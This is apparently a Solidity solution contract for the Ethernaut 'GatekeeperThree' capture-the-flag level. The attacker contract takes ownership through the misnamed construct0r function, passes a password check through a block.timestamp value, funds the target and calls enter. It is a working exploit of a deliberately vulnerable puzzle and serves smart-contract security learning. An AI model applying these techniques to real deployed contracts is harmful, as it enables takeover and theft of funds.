// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";
import "./SimpleTrick.sol";
import "hardhat/console.sol";

contract GKTAttacker {
    GatekeeperThree public target;
    SimpleTrick public trick;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
        target.construct0r();
        target.createTrick();
    }

    function attack(address payable _trick) public payable {
        trick = SimpleTrick(_trick);

        trick.checkPassword(0);
        target.getAllowance(block.timestamp);
        if (address(target).balance <= 0.001 ether) {
            payable(address(target)).transfer(0.002 ether);
        }
        target.enter();
    }

    // receive() external payable {
    //     revert();
    // }
}
